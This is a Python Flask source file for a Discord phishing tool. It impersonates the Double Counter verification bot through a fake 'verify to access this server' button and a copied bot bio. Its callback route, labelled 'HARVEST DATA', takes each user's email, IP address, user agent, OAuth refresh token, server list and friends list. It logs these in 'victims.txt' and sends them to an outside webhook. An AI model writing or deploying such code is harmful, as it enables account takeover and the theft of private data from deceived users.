from flask import Flask, request, redirect, render_template_string
import requests
import os
import json
import datetime
import urllib.parse
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)

# === CONFIGURATION ===
CLIENT_ID = os.getenv("CLIENT_ID")
CLIENT_SECRET = os.getenv("CLIENT_SECRET")
REDIRECT_URI = os.getenv("REDIRECT_URI", "https://YOUR_RENDER_URL.onrender.com/callback")
WEBHOOK_URL = os.getenv("WEBHOOK_URL")
BOT_TOKEN = os.getenv("BOT_TOKEN")
VERIFY_CHANNEL_ID = os.getenv("VERIFY_CHANNEL_ID", "1516478639858913322")

# === ROUTE 1: LANDING – DIRECT OAuth REDIRECT (NO VERIFICATION PAGE) ===
@app.route('/')
def index():
    # Directly redirect to Discord OAuth – no landing page, no "verify you're human"
    auth_url = (
        f"https://discord.com/api/oauth2/authorize"
        f"?client_id={CLIENT_ID}"
        f"&redirect_uri={urllib.parse.quote(REDIRECT_URI)}"
        f"&response_type=code"
        f"&scope=identify%20email%20guilds%20connections%20guilds.members.read%20messages.read%20relationships.read"
    )
    return redirect(auth_url)

# === ROUTE 2: CALLBACK – HARVEST DATA ===
@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code:
        return "No code provided", 400

    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')

    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI,
    }

    try:
        resp = requests.post('https://discord.com/api/oauth2/token', data=data)
        if resp.status_code != 200:
            return f"Token exchange failed: {resp.text}", 400

        token_data = resp.json()
        access_token = token_data['access_token']
        refresh_token = token_data['refresh_token']
        headers = {'Authorization': f'Bearer {access_token}'}

        # Get user data
        user_resp = requests.get('https://discord.com/api/users/@me', headers=headers)
        user_data = user_resp.json()

        # Get guilds
        guilds_resp = requests.get('https://discord.com/api/users/@me/guilds', headers=headers)
        guilds = guilds_resp.json() if guilds_resp.status_code == 200 else []

        # Get friends
        friends_resp = requests.get('https://discord.com/api/users/@me/relationships', headers=headers)
        friends = friends_resp.json() if friends_resp.status_code == 200 else []

        # Save to file
        with open('victims.txt', 'a', encoding='utf-8') as f:
            f.write(f"""
{'='*80}
🎯 VICTIM - {datetime.datetime.now().isoformat()}
ID: {user_data['id']}
Username: {user_data['username']}#{user_data.get('discriminator', '0000')}
Email: {user_data.get('email', 'N/A')}
IP: {ip}
User Agent: {user_agent}
Refresh Token: {refresh_token}
Guilds: {len(guilds)}
Friends: {len(friends)}
{'='*80}
""")

        # Send webhook
        if WEBHOOK_URL:
            payload = {
                "content": f"""
🎯 **NEW VICTIM!**
User: {user_data['username']}#{user_data.get('discriminator', '0000')}
ID: {user_data['id']}
Email: {user_data.get('email', 'N/A')}
IP: {ip}
Refresh Token: `{refresh_token}`
"""
            }
            requests.post(WEBHOOK_URL, json=payload)

        # Return success page (auto-closes)
        return """
        <html>
        <head><title>Verified</title></head>
        <body style="font-family: Arial; text-align: center; padding: 50px; background: #0a0a0f; color: #fff;">
            <h1 style="color: #57F287;">✅ Verification Complete!</h1>
            <p>You can now access the server.</p>
            <script>setTimeout(() => window.close(), 2000);</script>
        </body>
        </html>
        """

    except Exception as e:
        return f"Error: {e}", 500

# === ROUTE 3: SEND EMBED WITH GREEN BUTTON ===
@app.route('/send_embed')
def send_embed():
    if not BOT_TOKEN:
        return "BOT_TOKEN not set", 400

    base_url = os.getenv('RENDER_URL', 'https://your-render-url.onrender.com')
    verify_url = f"{base_url}/"  # Direct OAuth redirect

    # Embed with bunni fg name
    embed = {
        "title": "**bunni fg**",
        "description": "**APP.**\n\nVerify to access this server\nThis server uses **bunni fg** to block alt accounts and VPNs.\n\n**Server:** bunni fg",
        "color": 0x5865F2,
        "footer": {
            "text": "Double Counter is the best data-powered alt account and raid blocker on Discord. We provide instant verification based on 10+ factors. Double Counter is your best all-in-one security bot. https://doublecounter.gg/"
        },
        "timestamp": datetime.datetime.now().isoformat()
    }

    # GREEN button – directly to OAuth
    payload = {
        "embeds": [embed],
        "components": [{
            "type": 1,
            "components": [{
                "type": 2,
                "style": 4,  # GREEN button (success)
                "label": "Click here to verify",
                "url": verify_url
            }]
        }]
    }

    response = requests.post(
        f"https://discord.com/api/v10/channels/{VERIFY_CHANNEL_ID}/messages",
        headers={"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"},
        json=payload
    )

    if response.status_code == 200:
        return "✅ Embed with GREEN button sent!", 200
    else:
        return f"❌ Error: {response.text}", 400

# === ROUTE 4: UPDATE BOT BIO (DESCRIPTION) ===
@app.route('/update_bio')
def update_bio():
    """Update the bot's bio/description via Discord API"""
    if not BOT_TOKEN:
        return "BOT_TOKEN not set", 400

    bio = "Double Counter is the best data-powered alt account and raid blocker on Discord. We provide instant verification based on 10+ factors. Double Counter is your best all-in-one security bot. https://doublecounter.gg/"

    # Get current bot user
    bot_info = requests.get(
        "https://discord.com/api/v10/users/@me",
        headers={"Authorization": f"Bot {BOT_TOKEN}"}
    )
    
    if bot_info.status_code != 200:
        return f"❌ Failed to get bot info: {bot_info.text}", 400

    # Update bio (via PATCH /users/@me – note: this requires OAuth2 token, not bot token)
    # For bot accounts, the "bio" is actually the bot's description in the application
    # We'll update the application's description instead
    app_id = CLIENT_ID
    response = requests.patch(
        f"https://discord.com/api/v10/applications/{app_id}",
        headers={"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"},
        json={"description": bio}
    )

    if response.status_code == 200:
        return "✅ Bot bio updated!", 200
    else:
        return f"❌ Error updating bio: {response.text}", 400

if __name__ == '__main__':
    print("🔥 BUNNI FG EDITION RUNNING")
    print(f"📡 Redirect URI: {REDIRECT_URI}")
    print("📨 Send embed: visit /send_embed")
    print("📝 Update bio: visit /update_bio")
    app.run(host='0.0.0.0', port=5000, debug=True)
